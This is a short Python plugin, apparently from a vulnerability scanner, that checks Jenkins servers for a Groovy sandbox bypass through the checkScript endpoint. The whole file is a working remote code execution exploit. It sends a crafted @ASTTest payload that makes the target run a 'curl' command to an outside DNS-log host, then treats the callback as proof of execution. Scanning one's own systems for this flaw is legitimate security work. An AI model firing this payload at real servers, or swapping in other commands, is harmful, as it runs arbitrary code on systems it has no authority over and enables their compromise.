#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import asyncio
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB


    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                dns = self.get_dnslog_url()
                url = self.base_url + "securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+%22curl+" + dns + "%22.execute().text+%7d)%0aclass+Person%7b%7d"
                async with session.get(url=url, allow_redirects=False) as res:
                    pass
                await asyncio.sleep(1)
                if await self.get_dnslog_recode(dns):
                    yield url
